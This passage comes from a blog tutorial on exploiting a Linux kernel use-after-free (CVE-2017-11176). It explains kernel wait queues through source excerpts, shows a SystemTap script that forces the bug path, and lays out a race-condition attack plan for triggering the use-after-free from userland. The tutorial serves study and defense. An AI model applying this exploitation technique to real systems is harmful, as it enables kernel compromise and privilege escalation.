<span class="cp">    .task_list  = { NULL, NULL } }</span>

<span class="cp">#define DECLARE_WAITQUEUE(name, tsk)                    \</span>
<span class="cp">    wait_queue_t name = __WAITQUEUE_INITIALIZER(name, tsk) </span><span class="c1">// &lt;----- it creates a variable!</span>
</code></pre></div><p>...which is invoked like this:</p><div class="highlight"><pre><span></span><code><span class="n">DECLARE_WAITQUEUE</span><span class="p">(</span><span class="n">my_wait_queue_elt</span><span class="p">,</span><span class="w"> </span><span class="n">current</span><span class="p">);</span><span class="w"> </span><span class="c1">// &lt;----- use the "current" macro</span>
</code></pre></div><p>Finally, once a wait queue element is declared, it can be queued into a wait queue with the function <strong>add_wait_queue()</strong>. It basically just adds the element into the doubly linked list with proper <em>locking</em> (do not worry about it for now).</p><div class="highlight"><pre><span></span><code><span class="c1">// [kernel/wait.c]</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">add_wait_queue</span><span class="p">(</span><span class="n">wait_queue_head_t</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="n">wait_queue_t</span><span class="w"> </span><span class="o">*</span><span class="n">wait</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">flags</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">wait</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="o">~</span><span class="n">WQ_FLAG_EXCLUSIVE</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">spin_lock_irqsave</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">__add_wait_queue</span><span class="p">(</span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="n">wait</span><span class="p">);</span><span class="w">              </span><span class="c1">// &lt;----- here</span>
<span class="w">    </span><span class="n">spin_unlock_irqrestore</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">__add_wait_queue</span><span class="p">(</span><span class="n">wait_queue_head_t</span><span class="w"> </span><span class="o">*</span><span class="n">head</span><span class="p">,</span><span class="w"> </span><span class="n">wait_queue_t</span><span class="w"> </span><span class="o">*</span><span class="n">new</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">list_add</span><span class="p">(</span><span class="o">&amp;</span><span class="n">new</span><span class="o">-&gt;</span><span class="n">task_list</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">task_list</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Invoking <strong>add_wait_queue()</strong> is also called "registering to a wait queue".</p><h2 id="waking-up-a-task">Waking up a task</h2><p>So far, we know that there are two kinds of queues: run queues and wait queues. We saw that blocking a task is all about removing it from a run queue (with deactivate_task()). But how can it transition from the blocked (sleeping) state back to the running state?</p><p><strong>NOTE</strong>: Blocked task can be woken up through signals (and other means), but this is out-of-topic here.</p><p>Since a blocked task is not running anymore, <strong>it can't wake up itself</strong>. This needs to be done from <strong>another task</strong>.</p><p>Data structures which have the ownership of a particular resource have a wait queue. When a task wants to access this resource but it is not available at the moment, the task can put itself in a sleeping state until woken up by the resource's owner.</p><p>In order to be woken up when the resource becomes available, it has to register to the resource's wait queue. As we saw earlier, this "registration" is made with the <strong>add_wait_queue()</strong> call.</p><p>When the resource becomes available, the owner wakes one or more tasks so they can continue their executions. This is done with the <strong>__wake_up()</strong> function:</p><div class="highlight"><pre><span></span><code><span class="c1">// [kernel/sched.c]</span>

<span class="cm">/**</span>
<span class="cm"> * __wake_up - wake up threads blocked on a waitqueue.</span>
<span class="cm"> * @q: the waitqueue</span>
<span class="cm"> * @mode: which threads</span>
<span class="cm"> * @nr_exclusive: how many wake-one or wake-many threads to wake up</span>
<span class="cm"> * @key: is directly passed to the wakeup function</span>
<span class="cm"> *</span>
<span class="cm"> * It may be assumed that this function implies a write memory barrier before</span>
<span class="cm"> * changing the task state if and only if any tasks are woken up.</span>
<span class="cm"> */</span><span class="w"></span>

<span class="kt">void</span><span class="w"> </span><span class="nf">__wake_up</span><span class="p">(</span><span class="n">wait_queue_head_t</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">mode</span><span class="p">,</span><span class="w"></span>
<span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">nr_exclusive</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">flags</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">spin_lock_irqsave</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">__wake_up_common</span><span class="p">(</span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="n">mode</span><span class="p">,</span><span class="w"> </span><span class="n">nr_exclusive</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">);</span><span class="w">    </span><span class="c1">// &lt;----- here</span>
<span class="w">    </span><span class="n">spin_unlock_irqrestore</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="c1">// [kernel/sched.c]</span>

<span class="w">    </span><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">__wake_up_common</span><span class="p">(</span><span class="n">wait_queue_head_t</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">mode</span><span class="p">,</span><span class="w"></span>
<span class="w">          </span><span class="kt">int</span><span class="w"> </span><span class="n">nr_exclusive</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">wake_flags</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="n">wait_queue_t</span><span class="w"> </span><span class="o">*</span><span class="n">curr</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">next</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">   </span><span class="n">list_for_each_entry_safe</span><span class="p">(</span><span class="n">curr</span><span class="p">,</span><span class="w"> </span><span class="n">next</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">task_list</span><span class="p">,</span><span class="w"> </span><span class="n">task_list</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="kt">unsigned</span><span class="w"> </span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">flags</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="n">curr</span><span class="p">,</span><span class="w"> </span><span class="n">mode</span><span class="p">,</span><span class="w"> </span><span class="n">wake_flags</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"></span>
<span class="w">            </span><span class="p">(</span><span class="n">flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">WQ_FLAG_EXCLUSIVE</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!--</span><span class="n">nr_exclusive</span><span class="p">)</span><span class="w"></span>
<span class="w">          </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>This function iterates over every element in the wait queue [0] (<strong>list_for_each_entry_safe()</strong> is a common macro used with doubly linked list). For each element, it invokes the <strong>func()</strong> callback [1].</p><p>Remember the DECLARE_WAITQUEUE() macro? It sets the func callback to <strong>default_wake_function()</strong>:</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux/wait.h]</span>

<span class="cp">#define __WAITQUEUE_INITIALIZER(name, tsk) {                \</span>
<span class="cp">    .private    = tsk,                      \</span>
<span class="cp">    .func       = default_wake_function,            \                 </span><span class="c1">// &lt;------</span>
<span class="w">    </span><span class="p">.</span><span class="n">task_list</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span><span class="w"></span>

<span class="cp">#define DECLARE_WAITQUEUE(name, tsk)                    \</span>
<span class="cp">    wait_queue_t name = __WAITQUEUE_INITIALIZER(name, tsk)</span>
</code></pre></div><p>In turn, the default_wake_function() just calls <strong>try_to_wake_up()</strong> using the <strong>private</strong> field of the wait queue element (which points to the sleeping's <em>task_struct</em> most of the time):</p><div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">default_wake_function</span><span class="p">(</span><span class="n">wait_queue_t</span><span class="w"> </span><span class="o">*</span><span class="n">curr</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="n">mode</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">wake_flags</span><span class="p">,</span><span class="w"></span>
<span class="w">              </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">try_to_wake_up</span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">private</span><span class="p">,</span><span class="w"> </span><span class="n">mode</span><span class="p">,</span><span class="w"> </span><span class="n">wake_flags</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Finally, try_to_wake_up() is kind of the "opposite" of schedule(). While schedule() "schedules-out" the current task, try_to_wake_up() makes it schedulable again. That is, it puts it in a run queue and changes its running state!</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">try_to_wake_up</span><span class="p">(</span><span class="k">struct</span> <span class="nc">task_struct</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">state</span><span class="p">,</span><span class="w"></span>
<span class="w">              </span><span class="kt">int</span><span class="w"> </span><span class="n">wake_flags</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">rq</span><span class="w"> </span><span class="o">*</span><span class="n">rq</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="c1">// ... cut (find the appropriate run queue) ...</span>

<span class="nl">out_activate</span><span class="p">:</span><span class="w"></span>
<span class="w">    </span><span class="n">schedstat_inc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="n">se</span><span class="p">.</span><span class="n">nr_wakeups</span><span class="p">);</span><span class="w">              </span><span class="c1">// &lt;----- update some stats</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">wake_flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">WF_SYNC</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="n">schedstat_inc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="n">se</span><span class="p">.</span><span class="n">nr_wakeups_sync</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">orig_cpu</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">cpu</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="n">schedstat_inc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="n">se</span><span class="p">.</span><span class="n">nr_wakeups_migrate</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cpu</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">this_cpu</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="n">schedstat_inc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="n">se</span><span class="p">.</span><span class="n">nr_wakeups_local</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">else</span><span class="w"></span>
<span class="w">        </span><span class="n">schedstat_inc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="n">se</span><span class="p">.</span><span class="n">nr_wakeups_remote</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">activate_task</span><span class="p">(</span><span class="n">rq</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="n">en_flags</span><span class="p">);</span><span class="w">               </span><span class="c1">// &lt;----- put it back to run queue!</span>
<span class="w">    </span><span class="n">success</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TASK_RUNNING</span><span class="p">;</span><span class="w">                      </span><span class="c1">// &lt;----- the state has changed!</span>

<span class="w">    </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>This is where <strong>activate_task()</strong> is invoked (there are other places). Because the task is now back in a run queue <strong>and</strong> its state is TASK_RUNNING, it has a chance of being scheduled. Hence, continue its execution where it was after the call to schedule().</p><p>In practice, __wake_up() is rarely called directly. Instead, those helper macros are invoked:</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux/wait.h]</span>

<span class="cp">#define wake_up(x)          __wake_up(x, TASK_NORMAL, 1, NULL)</span>
<span class="cp">#define wake_up_nr(x, nr)       __wake_up(x, TASK_NORMAL, nr, NULL)</span>
<span class="cp">#define wake_up_all(x)          __wake_up(x, TASK_NORMAL, 0, NULL)</span>

<span class="cp">#define wake_up_interruptible(x)    __wake_up(x, TASK_INTERRUPTIBLE, 1, NULL)</span>
<span class="cp">#define wake_up_interruptible_nr(x, nr) __wake_up(x, TASK_INTERRUPTIBLE, nr, NULL)</span>
<span class="cp">#define wake_up_interruptible_all(x)    __wake_up(x, TASK_INTERRUPTIBLE, 0, NULL)</span>
</code></pre></div><h2 id="a-complete-example">A Complete Example</h2><p>Here is a simple example to summarize the aforementioned concepts:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">resource_a</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">bool</span><span class="w"> </span><span class="n">resource_is_ready</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">wait_queue_head_t</span><span class="w"> </span><span class="n">wq</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="kt">void</span><span class="w"> </span><span class="nf">task_0_wants_resource_a</span><span class="p">(</span><span class="k">struct</span> <span class="nc">resource_a</span><span class="w"> </span><span class="o">*</span><span class="n">res</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="o">-&gt;</span><span class="n">resource_is_ready</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="c1">// "register" to be woken up</span>
<span class="w">    </span><span class="n">DECLARE_WAITQUEUE</span><span class="p">(</span><span class="n">task0_wait_element</span><span class="p">,</span><span class="w"> </span><span class="n">current</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">add_wait_queue</span><span class="p">(</span><span class="o">&amp;</span><span class="n">res</span><span class="o">-&gt;</span><span class="n">wq</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">task0_wait_element</span><span class="p">);</span><span class="w"></span>

<span class="w">    </span><span class="c1">// start sleeping</span>
<span class="w">    </span><span class="n">__set_current_state</span><span class="p">(</span><span class="n">TASK_INTERRUPTIBLE</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">schedule</span><span class="p">();</span><span class="w"></span>

<span class="w">    </span><span class="c1">// We'll restart HERE once woken up</span>
<span class="w">    </span><span class="c1">// Remember to "unregister" from wait queue</span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="c1">// XXX: ... do something with the resource ...</span>
<span class="p">}</span><span class="w"></span>

<span class="kt">void</span><span class="w"> </span><span class="nf">task_1_makes_resource_available</span><span class="p">(</span><span class="k">struct</span> <span class="nc">resource_a</span><span class="w"> </span><span class="o">*</span><span class="n">res</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="n">res</span><span class="o">-&gt;</span><span class="n">resource_is_ready</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">wake_up_interruptible_all</span><span class="p">(</span><span class="o">&amp;</span><span class="n">res</span><span class="o">-&gt;</span><span class="n">wq</span><span class="p">);</span><span class="w">  </span><span class="c1">// &lt;--- unblock "task 0"</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>One thread runs the <em>task_0_wants_resource_a()</em> function which becomes blocking because the "resource" is not available. At some point, the resource owner makes it available (from another thread) and calls <em>task_1_makes_resource_available()</em>. After this, the execution of task_0_wants_resource_a() can resume.</p><p>This is a pattern that you will often see in the Linux Kernel code, you now know what it means. Note that the term "resource" has been used here in a generic way. Tasks can wait for an event, a condition to be true or something else. Every time you see a "blocking" syscall, chances are a wait queue is not that far :-).</p><p>Let's move on and start implementing the proof-of-concept.</p><hr><h1 id="unblocking-the-main-thread">Unblocking the Main Thread</h1><p>In the <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">previous article</a>, we experimented several issues while trying to force netlink_attachskb() to return 1. The first issue was the call to mq_notify() that became <strong>blocking</strong>. In order to avoid this, we simply <em>bypassed</em> the call to schedule_timeout() but then, we created an <strong>infinite loop</strong>. We stopped the loop by removing our target file descriptor from the file descriptor table (FDT), which incidentally satisfied the last condition: it makes the second fget() call return NULL. This was done with the help of a System Tap script:</p><div class="highlight"><pre><span></span><code>    <span class="k">function</span> force_trigger:long <span class="o">(</span>arg_sock:long<span class="o">)</span>
    %<span class="o">{</span>
      struct sock *sk <span class="o">=</span> <span class="o">(</span>void*<span class="o">)</span> STAP_ARG_arg_sock<span class="p">;</span>
<span class="o">[</span><span class="m">0</span><span class="o">]</span>   sk-&gt;sk_flags <span class="p">|</span><span class="o">=</span> <span class="o">(</span><span class="m">1</span> &lt;&lt; SOCK_DEAD<span class="o">)</span><span class="p">;</span> // avoid blocking the thread

      struct netlink_sock *nlk <span class="o">=</span> <span class="o">(</span>void*<span class="o">)</span> sk<span class="p">;</span>
      nlk-&gt;state <span class="p">|</span><span class="o">=</span> <span class="m">1</span><span class="p">;</span>   // enter the netlink_attachskb<span class="o">()</span> retry path    

      struct files_struct *files <span class="o">=</span> current-&gt;files<span class="p">;</span>
      struct fdtable *fdt <span class="o">=</span> files_fdtable<span class="o">(</span>files<span class="o">)</span><span class="p">;</span>
      fdt-&gt;fd<span class="o">[</span><span class="m">3</span><span class="o">]</span> <span class="o">=</span> NULL<span class="p">;</span> // makes the second call to fget<span class="o">()</span> fails
    %<span class="o">}</span>
</code></pre></div><p>In this section, we will try to remove the line [0] that sets the SOCK_DEAD flag of a struct sock. It means that the call of mq_notify() will become blocking again. From here, we have two possibilities:</p><ol><li>Mark the sock as SOCK_DEAD (as the stap script does)</li><li>Unblock the thread</li></ol><h2 id="control-and-win-the-race">Control (and win) the race</h2><p>Having our main thread blocked is actually <strong>a good thing</strong>. This is kind of a gift from an exploiter point-of-view. Remember that the patch described something about a "small window"? What was our attack scenario?</p><div class="highlight"><pre><span></span><code>Thread-1                            | Thread-2              | file refcnt | sock refcnt | sock ptr           |
------------------------------------+-----------------------+-------------+-------------+--------------------+
 mq_notify()                        |                       | 1           | 1           | NULL               |
                                    |                       |             |             |                    |
  fget(&lt;TARGET_FD&gt;) -&gt; ok           |                       | 2 (+1)      | 1           | NULL               |
                                    |                       |             |             |                    |
  netlink_getsockbyfilp() -&gt; ok     |                       | 2           | 2 (+1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fput(&lt;TARGET_FD&gt;) -&gt; ok           |                       | 1 (-1)      | 2           | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_attachskb() -&gt; returns 1  |                       | 1           | 1 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
                                    | close(&lt;TARGET_FD&gt;)    | 0 (-1)      | 0 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto retry                        |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fget(&lt;TARGET_FD) -&gt; returns NULL  |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto out                          |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_detachskb() -&gt; UAF!       |                       | FREE        | (-1) in UAF | 0xffffffc0aabbccdd |
</code></pre></div><p>So, the "small window" is where we have the opportunity to call close(). As a reminder, calling close() will make the call to fget() return NULL. The window itself starts <strong>after</strong> the call to fget() succeeds, and stops <strong>before</strong> the second call to fget(). In the attack scenario, we call close() after netlink_attachskb(), but in the system stap script we actually <em>simulated</em> it (we don't call close) before calling netlink_attachskb().</p><p>If we by-pass the call to schedule_timeout(), the window will be indeed "small". It was not an issue with System Tap, since we modified the kernel data structure before calling netlink_attachskb(). We won't have such luxury in userland.</p><p>On the other hand, if we can block in the middle of netlink_attachskb() and have a way to unlock it, the window is actually as big as we want. In other words, we have a means to <strong>control the race condition</strong>. One can see this as a "breakpoint" in the main thread flow.</p><p>The Attack Plan becomes:</p><div class="highlight"><pre><span></span><code>Thread-1                            | Thread-2              | file refcnt | sock refcnt | sock ptr           |
------------------------------------+-----------------------+-------------+-------------+--------------------+
 mq_notify()                        |                       | 1           | 1           | NULL               |
  fget(&lt;TARGET_FD&gt;) -&gt; ok           |                       | 2 (+1)      | 1           | NULL               |
                                    |                       |             |             |                    |
  netlink_getsockbyfilp() -&gt; ok     |                       | 2           | 2 (+1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fput(&lt;TARGET_FD&gt;) -&gt; ok           |                       | 1 (-1)      | 2           | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_attachskb()               |                       | 1           | 2           | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
    schedule_timeout() -&gt; SLEEP     |                       | 1           | 2           | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
                                    | close(&lt;TARGET_FD&gt;)    | 0 (-1)      | 1 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
                                    | UNBLOCK THREAD-1      | FREE        | 1           | 0xffffffc0aabbccdd |
    &lt;&lt;&lt; Thread-1 wakes up &gt;&gt;&gt;       |                       |             |             |                    |
    sock_put()                      |                       | FREE        | 0 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_attachskb() -&gt; returns 1  |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto retry                        |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fget(&lt;TARGET_FD) -&gt; returns NULL  |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto out                          |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_detachskb() -&gt; UAF!       |                       | FREE        | (-1) in UAF | 0xffffffc0aabbccdd |
</code></pre></div><p>Alright, blocking the main thread seems to be a good idea to win the race, but it means we now need to unblock the thread.</p><h2 id="identify-unblocker-candidates">Identify "unblocker" candidates</h2><p>If you didn't understand the "Core Concept #2" section by now, it might be the time to get back to it. In this section, we will see how netlink_attachskb() starts blocking and how can we unblock it.</p><p>Let's have a look again to netlink_attachskb():</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="c1">// [net/netlink/af_netlink.c]</span>

<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_attachskb</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sk_buff</span><span class="w"> </span><span class="o">*</span><span class="n">skb</span><span class="p">,</span><span class="w"></span>
<span class="w">              </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="n">timeo</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">ssk</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="o">*</span><span class="n">nlk</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="n">nlk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>

<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rmem_alloc</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rcvbuf</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">test_bit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">     </span><span class="n">DECLARE_WAITQUEUE</span><span class="p">(</span><span class="n">wait</span><span class="p">,</span><span class="w"> </span><span class="n">current</span><span class="p">);</span><span class="w"></span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!*</span><span class="n">timeo</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="c1">// ... cut (unreachable code from mq_notify) ...</span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">     </span><span class="n">__set_current_state</span><span class="p">(</span><span class="n">TASK_INTERRUPTIBLE</span><span class="p">);</span><span class="w"></span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">     </span><span class="n">add_wait_queue</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">wait</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">wait</span><span class="p">);</span><span class="w"></span>

<span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rmem_alloc</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rcvbuf</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">test_bit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">))</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"></span>
